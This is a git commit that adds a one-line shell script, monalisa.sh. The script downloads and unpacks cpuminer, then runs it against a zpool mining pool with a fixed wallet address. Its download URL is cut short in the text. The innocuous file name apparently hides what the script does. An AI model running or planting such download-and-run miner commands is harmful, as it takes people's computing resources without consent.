93353978343be4839a4897ce0160c9b8c41b873a
kedulal <114283469+kedulal@users.noreply.github.com>
2022-10-24 20:59:10 +0700

    Add files via upload

---
+++ monalisa.sh
@@ -0,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-o... && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a allium -o stratum+tcp://allium.sea.mine.zpool.ca:6433 -u DPZ71MSVYBAdGsReuiogkTyAZqYcESxhwn -p c=DGB -t 2
